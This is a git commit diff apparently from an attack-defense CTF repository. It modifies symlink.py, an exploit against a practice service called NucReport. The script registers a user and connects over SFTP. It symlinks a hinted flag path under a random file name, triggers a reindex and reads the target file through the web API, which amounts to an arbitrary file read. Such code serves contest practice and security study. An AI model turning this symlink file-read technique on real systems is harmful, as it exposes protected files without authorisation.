ba9781566638de4be561e2a0a1dd6cf29ad76e64
jnovikov <johnnovikov0@gmail.com>
2022-11-28 00:28:50 +0000

    NucReport pre-release: exploit cleanup

--- sploits/nucreport/symlink.py
+++ sploits/nucreport/symlink.py
@@ -1,7 +1,7 @@
 import sys
 
+import checklib
 import paramiko
-import requests
 
 IP = sys.argv[1]
 HINT = sys.argv[2]
@@ -10,14 +10,14 @@ URL = 'http://{}:8080'.format(IP)
 
 
 def register(username: str, password: str):
-    sess = requests.Session()
+    sess = checklib.get_initialized_session()
     resp = sess.post(URL + '/register', json={'username': username, 'password': password})
     assert resp.status_code == 200
     return sess
 
 
 def login(username: str, password: str):
-    sess = requests.Session()
+    sess = checklib.get_initialized_session()
     resp = sess.post(URL + '/login', json={'username': username, 'password': password})
     assert resp.status_code == 200
     return sess
@@ -28,18 +28,18 @@ def reindex(sess):
     assert resp.status_code == 200
 
 
-def read_hack_file(sess):
+def read_hack_file(sess, fname):
     resp = sess.get(URL + '/files')
     for x in resp.json():
-        if 'hack.txt' in x['path']:
+        if fname in x['path']:
             resp = sess.get(URL + '/file', params={'path': x['path'], 'token': x['token']})
             print(resp.text, flush=True)
             break
 
 
-u = 'randomusername'
-p = 'randompassword'
-# s = register(u, p)
+u = checklib.rnd_username(5)
+p = checklib.rnd_password(10)
+register(u, p)
 s = login(u, p)
 
 cli = paramiko.SSHClient()
@@ -47,8 +47,8 @@ cli.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 cli.connect(IP, port=4222, username=u, password=p)
 sftp_cli = cli.open_sftp()
 
-sftp_cli.remove('hack.txt')
-sftp_cli.symlink(HINT, 'hack.txt')
+hack_file_name = checklib.rnd_string(4) + '.txt'
+sftp_cli.symlink(HINT, hack_file_name)
 
 reindex(s)
-read_hack_file(s)
+read_hack_file(s, hack_file_name)
